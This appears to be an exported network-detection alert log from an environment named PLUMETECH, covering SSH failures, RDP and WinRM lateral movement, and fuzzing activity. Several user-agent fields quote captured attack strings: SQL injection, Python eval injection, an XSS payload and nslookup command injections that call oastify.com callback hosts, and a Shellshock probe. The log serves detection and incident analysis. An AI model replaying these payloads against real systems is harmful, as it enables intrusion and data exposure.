+  client_asset_id: 1905, 1898, 1737, 1910, 1936, 1916, 1746, 44, 151;
+  src__mac: ;
+  not_after: , 2025-09-16T23:59:59Z, 2025-11-19T23:59:59Z, 2026-03-19T23:59:59Z, 2025-05-15T23:59:59Z, 2026-02-07T23:59:59Z, 2025-06-20T23:59:59Z, 2026-03-27T01:24:33Z, 2025-10-28T23:59:59Z, 2025-07-01T23:59:59Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.1.29, 10.0.6.29, 10.0.1.30, 10.0.4.30, 10.0.6.30, 10.0.8.30, 10.0.12.29, 10.0.5.30, 10.0.12.30;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1916,44,1898,1910,151,1905,1936,1754,3680,3676,3733,3702,3609,3727,3707,3665,3750,1737,1746",,,"10.0.6.11,163.5.194.35,5.135.209.101,13.32.99.104,142.250.186.66,151.101.66.137,104.26.2.70,2.19.198.67,35.214.175.96,52.31.109.203","10.0.8.30,10.0.1.29,10.0.6.30,10.0.12.30,10.0.1.30,10.0.4.30,10.0.5.30,10.0.12.29,10.0.6.29",,"a1a14540-7106-4701-8338-8b34b48ab06d, 59316db6-f1b0-42f0-acc5-1303a9bf5b47, 016a9776-5e47-438e-882d-73739d046542, d198db01-e208-4b1c-848a-40dbd176eb48, a8161dc4-f92b-459a-ae6e-cc70cf67f8f0, ccf163db-5977-4918-a306-a9b2812d2b26, 7bf004cd-939b-430a-ae69-93ea2d575e68, e596c3e3-9531-4546-bbca-d99be4f6afcc, 4e9b80bd-1d20-499a-a7ce-97f7d6efb99a, 19b37432-32c8-47d1-a3a4-acbcfe7abe38",
+Low,32396,2025-03-28T10:03:07Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,92d89cf4-0326-49a0-a447-99cffa658f90,
+Low,32400,2025-03-28T10:00:36Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.45.,SSH Authentication Failure,"2896,1825",,,10.0.242.127,10.0.4.45,,c0de7767-c67f-4b22-8160-e9fba5d32931,
+Low,32411,2025-03-28T08:47:40Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,26acbd6f-f245-421f-b92a-e3500e9cde7b,
+Low,32601,2025-03-28T10:17:28Z,Indicator,Threat Behavior,HTTP URI CLI Command netstat,HTTP URI CLI Command netstat,HTTP Hunting CLI Signatures,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32611,2025-03-28T10:17:29Z,Indicator,Threat Behavior,HTTP URI CLI Command ifconfig,HTTP URI CLI Command ifconfig,HTTP Hunting CLI Signatures,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32616,2025-03-28T10:18:04Z,Indicator,Threat Behavior,HTTP URI CLI Command nslookup,HTTP URI CLI Command nslookup,HTTP Hunting CLI Signatures,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32727,2025-03-28T10:28:34Z,Asset,Configuration,Detected 99 NewUserAgent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:28:34.138Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
+  src__mac: ;
+  src_ip: 10.0.5.29, 10.0.7.30, 10.0.3.29, 10.0.10.30, 10.0.4.30, 10.0.9.12, 10.0.9.29, 10.0.5.30, 10.0.12.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1905, 1704, 1709, 1910, 1936, 1919, 1729, 1854, 1914;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Microsoft BITS/7.8, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), Microsoft-CryptoAPI/10.0, '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--;
+  src__ip: ;",User Agent First Seen,"1729,1854,1709,1919,1914,1910,1704,1905,1936",,,,,"10.0.9.29,10.0.9.12,10.0.3.29,10.0.10.30,10.0.7.30,10.0.12.30,10.0.5.29,10.0.4.30,10.0.5.30","d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
+Low,32728,2025-03-28T10:23:13Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,64ba35b1-f968-440d-b1e8-c1671c6dbb69,
+Low,32743,2025-03-28T09:14:14Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,17a0bb1a-61b3-4ada-a956-804a89adf7dd,
+Low,32747,2025-03-28T09:00:55Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,e7a8f3a2-5873-4416-8e58-501834812f68,
+Low,32774,2025-03-28T10:19:46Z,Communication,Configuration,Detected 93 New Global User Agent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:19:46.276Z,"Sample New Global User Agent values include:
+  dst__port: ('',);
+  dst_asset_id: 1841, 1697, 1829, 1742;
+  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
+  dst_ip: 10.0.12.11, 10.0.5.12, 10.0.7.12, 10.0.4.12;
+  src__mac: ;
+  src_ip: 10.0.4.30, 10.0.7.30, 10.0.5.30, 10.0.12.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1910, 1905, 1914, 1936;
+  dst__ip: ;
+  host: 10.0.12.11, oastify.com, 10.0.4.12, 10.0.5.12, localhost;
+  src__port: ('',);
+  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|echo cxshsd7ofj sqooozn4bw||a #' |echo cxshsd7ofj sqooozn4bw||a #|"" |echo cxshsd7ofj sqooozn4bw||a #, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3671263895' or '9441'='9442;
+  src__ip: ;",User Agent First Seen Globally,"1914,1742,1910,1841,1905,1936,1697,1829",,,"10.0.7.30,10.0.12.30,10.0.4.30,10.0.5.30","10.0.12.11,10.0.7.12,10.0.5.12,10.0.4.12",,"d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
+Medium,32786,2025-03-28T10:30:16Z,Indicator,Indicator,WinRM User Agent,WinRM User Agent,WinRM Signatures,"1905,1763",,,10.0.4.30,10.0.4.29,,Network Traffic,
+Medium,32787,2025-03-28T10:30:16Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1905,1763",,,10.0.4.30,10.0.4.29,,Network Traffic,
+Medium,32788,2025-03-28T10:30:16Z,Indicator,Indicator,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM Signatures,"1905,1763",,,10.0.4.30,10.0.4.29,,Network Traffic,
+Medium,32792,2025-03-28T10:30:24Z,Indicator,Indicator,Python PSRP Client User-Agent,Python PSRP Client User-Agent,Python User Agent Signatures,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Medium,32794,2025-03-28T10:30:28Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,32796,2025-03-28T10:30:24Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32831,2025-03-28T10:37:39Z,Communication,Configuration,Detected 21 NewX509Certificate between 2025-03-28T10:26:38.369Z and 2025-03-28T10:37:39.407Z,"Sample NewX509Certificate values include:
+  server: 23.3.89.120, 23.11.206.112, 23.11.206.104, 142.250.185.138, 184.25.50.200, 98.64.238.3, 40.126.31.2, 104.208.16.92, 23.32.238.99, 23.32.238.96;
+  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
+  not_before: , 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z;
+  server_asset_id: 3811, 1772, 3831, 3825, 3830, 1779, 3817, 3828, 3816, 3785;
+  dst__port: ('',);
+  dns: ;
+  uuid: 460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb;
+  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
+  client_asset_id: 1905, 48, 1916, 1746, 1729, 1704, 1914;
+  src__mac: ;
+  not_after: , 2025-09-16T23:59:59Z, 2026-03-27T01:24:33Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.5.29, 10.0.6.29, 10.0.7.30, 10.0.4.30, 10.0.8.30, 10.0.2.11, 10.0.9.29;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1914,1772,48,1729,1704,1916,1905,3831,3830,3825,3828,3811,1779,3817,3816,3785,1746",,,"10.0.7.11,184.25.50.161,20.189.173.24,98.64.238.3,40.90.65.40,23.3.89.120,10.0.8.11,23.11.206.98,184.25.50.200,23.11.206.112","10.0.7.30,10.0.2.11,10.0.9.29,10.0.5.29,10.0.8.30,10.0.4.30,10.0.6.29",,"460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb",
+Low,32832,2025-03-28T10:43:52Z,Asset,Configuration,Detected 7 NewUserAgent between 2025-03-28T10:30:03.270Z and 2025-03-28T10:43:52.442Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: ec08ee54-46df-4b8a-b4af-e1e146ac9e05, 03bf0cf0-4928-448b-ae06-dbaf45c3cce3, 042fda49-036e-4f2d-b4c1-2206a3e48d24, 14808401-9953-49e7-8577-a8b8807a307a, 000b2a7f-644a-4b24-9909-9b01c3dfb6d1, 4c014e11-1667-4d89-a788-0c563ecf438c, 0001445f-cd4d-4260-b410-c2a39529be73;
+  src__mac: ;
+  src_ip: 10.0.4.30, 10.0.9.30, 10.0.2.11, 10.0.11.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1921, 1905, 1933, 48;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Microsoft WinRM Client, Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1), Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36, Microsoft BITS/7.8, () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0, Python PSRP Client;
+  src__ip: ;",User Agent First Seen,"48,1933,1905,1921",,,,,"10.0.2.11,10.0.11.30,10.0.4.30,10.0.9.30","ec08ee54-46df-4b8a-b4af-e1e146ac9e05, 03bf0cf0-4928-448b-ae06-dbaf45c3cce3, 042fda49-036e-4f2d-b4c1-2206a3e48d24, 14808401-9953-49e7-8577-a8b8807a307a, 000b2a7f-644a-4b24-9909-9b01c3dfb6d1, 4c014e11-1667-4d89-a788-0c563ecf438c, 0001445f-cd4d-4260-b410-c2a39529be73",
+Low,32833,2025-03-28T10:29:29Z,Communication,Configuration,Detected 6 RDP New Comms between 2025-03-28T10:29:04.573Z and 2025-03-28T10:29:29.836Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.4.30, 10.0.4.29, 10.0.4.11, 10.0.4.12;
+  dst_asset_id: 1905, 1832, 1829, 1763;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.4.30, 10.0.4.29, 10.0.4.11, 10.0.4.12;
+  rdp_selected_protocol: , hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1905, 1763, 1829, 1832;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , devel;
+  src__ip: ;",RDP New Comms Pattern,"1832,1905,1763,1829",,,"10.0.4.11,10.0.4.30,10.0.4.29,10.0.4.12","10.0.4.11,10.0.4.30,10.0.4.29,10.0.4.12",,,
+Low,32836,2025-03-28T10:33:09Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,04edf1f5-0bd0-4a12-b77a-a2220011af7a,
+Low,32838,2025-03-28T10:39:55Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,cd3b989a-14eb-465a-8f40-6124848c0c3a,
+Low,32847,2025-03-28T09:33:21Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,9056d0e9-2a09-4bad-ba91-4c60f468af47,
+Low,32858,2025-03-28T10:30:16Z,Communication,Indicator,Failed HTTP Logon,"Asset 1763 (10.0.4.29) returned an HTTP response code of 401 'Unauthorized' to asset 1905 (10.0.4.30), which represents a failed logon attempt via HTTP by asset 1905. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1905,1763",,,10.0.4.29,10.0.4.30,,693ce30d-bd70-445f-8a50-bd161790b5ca,
+Low,32910,2025-03-28T10:38:33Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1905 (10.0.4.30) to then pivot to asset 1763 (10.0.4.29) via RDP.,Interactive Session Pivots,"2896,1763",,,10.0.242.127,10.0.4.29,,,
+Low,32927,2025-03-28T10:45:49Z,Indicator,Threat Behavior,HTTP URI CLI Command crontab,HTTP URI CLI Command crontab,HTTP Hunting CLI Signatures,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32928,2025-03-28T10:45:48Z,Indicator,Threat Behavior,HTTP URI CLI Command wget,HTTP URI CLI Command wget,HTTP Hunting CLI Signatures,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32929,2025-03-28T10:45:49Z,Indicator,Indicator,HTTP Request for .bat (batch) File,HTTP Request for .bat (batch) File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32930,2025-03-28T10:45:50Z,Indicator,Indicator,HTTP Request for .hlp WinHelp File,HTTP Request for .hlp WinHelp File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32931,2025-03-28T10:45:50Z,Indicator,Threat Behavior,HTTP Request .bash_history,HTTP Request .bash_history,HTTP Hunting Signatures,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32932,2025-03-28T10:45:50Z,Indicator,Indicator,HTTP Request for .hta File,HTTP Request for .hta File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32933,2025-03-28T10:45:49Z,Indicator,Indicator,HTTP Request for .vbs VBScript File,HTTP Request for .vbs VBScript File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32934,2025-03-28T10:45:49Z,Indicator,Indicator,HTTP Request for .jar File,HTTP Request for .jar File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32935,2025-03-28T10:45:51Z,Indicator,Threat Behavior,HTTP URI CLI Command whoami,HTTP URI CLI Command whoami,HTTP Hunting CLI Signatures,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32936,2025-03-28T10:45:51Z,Indicator,Indicator,HTTP Request for .cmd File,HTTP Request for .cmd File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32938,2025-03-28T10:47:30Z,Indicator,Indicator,HTTP Request for .hlp WinHelp File,HTTP Request for .hlp WinHelp File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32939,2025-03-28T10:47:29Z,Indicator,Indicator,HTTP Request for .jar File,HTTP Request for .jar File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32940,2025-03-28T10:47:31Z,Indicator,Indicator,HTTP Request for .hta File,HTTP Request for .hta File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32941,2025-03-28T10:47:30Z,Indicator,Indicator,HTTP Request for .vbs VBScript File,HTTP Request for .vbs VBScript File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32942,2025-03-28T10:47:31Z,Indicator,Indicator,HTTP Request for .cmd File,HTTP Request for .cmd File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32943,2025-03-28T10:47:30Z,Indicator,Indicator,HTTP Request for .bat (batch) File,HTTP Request for .bat (batch) File,HTTP Request for File Extension,"1905,1829",,,10.0.4.30,10.0.4.12,,Network Traffic,
+Low,32979,2025-03-28T10:29:29Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.4.29 (1763) (Enterprise Management/Server) received RDP traffic from 10.0.4.30 (1905).,RDP to Enterprise Management Asset,"1905,1763",,,10.0.4.30,10.0.4.29,,49bbe6de-9a35-4c1d-a5c2-88ea4a039774,
+Low,32984,2025-03-28T10:29:04Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.4.12 (1829) (Enterprise Management/Server) received RDP traffic from 10.0.4.30 (1905).,RDP to Enterprise Management Asset,"1905,1829",,,10.0.4.30,10.0.4.12,,922fc958-a273-4ad2-8e6b-d518e14c65c6,
+Low,33430,2025-03-28T10:18:04Z,Communication,Configuration,New Global User Agent,User Agent 'Fuzz Faster U Fool v2.1.0-dev' was seen in the environment for the first time. Originating from asset 1905 (10.0.4.30) to 10.0.4.12 (10.0.4.12).,User Agent First Seen Globally,"1905,1829",,,10.0.4.30,10.0.4.12,,0000eeff-04c5-4805-8fcd-400617d67e81,
+Low,33433,2025-03-28T10:13:19Z,Communication,Configuration,New Global User Agent,User Agent 'WhatWeb/0.5.5' was seen in the environment for the first time. Originating from asset 1905 (10.0.4.30) to 10.0.4.12 (10.0.4.12).,User Agent First Seen Globally,"1905,1829",,,10.0.4.30,10.0.4.12,,e4c32ee7-23f3-4677-b59d-ab4c70a034f5,
+Low,33449,2025-03-28T10:29:29Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.29 (1763) to host 10.0.4.30 (1905). If unencrypted, may also include the RDP cookie (devel), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1905,1763",,,10.0.4.29,10.0.4.30,,,
+Low,33450,2025-03-28T10:29:29Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.30 (1905) to host 10.0.4.29 (1763). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1905,1763",,,10.0.4.30,10.0.4.29,,,
+Low,33451,2025-03-28T10:29:10Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.11 (1832) to host 10.0.4.30 (1905). If unencrypted, may also include the RDP cookie (devel), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1905,1832",,,10.0.4.11,10.0.4.30,,,
+Low,33452,2025-03-28T10:29:10Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.30 (1905) to host 10.0.4.11 (1832). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1905,1832",,,10.0.4.30,10.0.4.11,,,
+Low,33453,2025-03-28T10:29:04Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.30 (1905) to host 10.0.4.12 (1829). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1905,1829",,,10.0.4.30,10.0.4.12,,,
+Low,33454,2025-03-28T10:29:04Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.12 (1829) to host 10.0.4.30 (1905). If unencrypted, may also include the RDP cookie (devel), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1905,1829",,,10.0.4.12,10.0.4.30,,,
+Low,33511,2025-03-28T10:56:28Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1763 and Asset:1832,New SMB Communication Detection,"1763,1832",,,10.0.4.29,10.0.4.11,,bff3e010-2ad1-4f02-9488-54a7efe126eb,
+Low,33513,2025-03-28T10:48:02Z,Communication,Configuration,New SMB Communication detected,"New SMB_FileInfo (version: ['SMB1', 'SMB2']) traffic between Asset:1905 and Asset:1763",New SMB Communication Detection,"1905,1763",,,10.0.4.30,10.0.4.29,,812d7aa7-b169-48be-b9ac-058e9acb4681,
+Low,33523,2025-03-28T10:53:15Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,fb324b53-a104-444a-ac97-87f22caa5619,
+Low,33531,2025-03-28T10:43:15Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,bec3ff51-03db-4cd5-91ab-27624d75cce6,
+Low,33558,2025-03-28T10:53:50Z,Communication,Configuration,Detected 30 NewX509Certificate between 2025-03-28T10:39:33.023Z and 2025-03-28T10:53:50.707Z,"Sample NewX509Certificate values include:
+  server: 20.190.160.132, 184.25.50.177, 40.126.31.67, 95.100.158.122, 95.100.158.115, 52.182.143.209, 23.3.89.96, 2.16.110.161, 10.0.3.11, 142.250.74.202;
+  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com, C=US, ST=WA, L=Redmond, O=Microsoft, OU=DSP, CN=*.prod.do.dsp.mp.microsoft.com, C=US, ST=WA, L=Redmond, O=Microsoft Corporation, CN=arc.msn.com;
+  not_before: , 2025-03-04T20:39:31Z, 2025-03-27T01:24:33Z, 2025-03-16T00:00:00Z, 2025-03-09T16:45:25Z;
+  server_asset_id: 1713, 3846, 3845, 3860, 3858, 3865, 3847, 357, 3853, 3850;
+  dst__port: ('',);
+  dns: ;
+  uuid: e4f0d828-4c5a-4ff7-9eab-b822087a0ca7, 8adbaee7-db9d-4288-a47c-75c64cb3ebe5, 7649c6e2-8485-4e0b-8b92-ba4e37df1fa3, ab9d1caf-ac5a-4ca2-9c89-a358173237d2, b46ddac8-f7f7-42e5-9a78-364f0b7db769, 6cfee7ff-8ac1-4371-8cb6-5405bc62bf45, 18a22f55-7840-4767-9b0a-f4a22a84be64, 1ae19404-7899-44fa-aab8-9f8d0d2795cf, 1d6adc8f-e1ea-421e-a8f6-0a9b171519c1, 33862a12-346a-4b6f-aef2-fc24441fd3c3;
+  issuer: , C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft ECC Content Distribution Secure Server CA 2.1, C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 03, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA, DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA;
+  client_asset_id: 1896, 48, 1801, 1763, 1704, 1914;
+  src__mac: ;
